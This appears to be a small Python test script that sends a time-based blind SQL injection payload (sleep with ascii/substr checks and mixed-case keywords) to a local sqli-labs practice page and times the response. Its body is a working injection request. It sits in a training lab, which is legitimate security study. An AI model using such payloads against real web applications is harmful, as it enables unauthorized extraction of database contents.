# -*- coding: UTF-8 -*-
from difflib import SequenceMatcher
import requests
import sys
from urllib import parse
import re
import aiohttp
from aiohttp import ClientSession
import asyncio
import json
import time

url = "http://127.0.0.1/sqli-labs-master/Less-9/?id=1'and(sleep(if(!(select(aScii(suBstr('867546938',2,1))<>54)),5,1)))%23"
time1 = time.time()
q = requests.get(url)
time2 = time.time()
print(time2 - time1)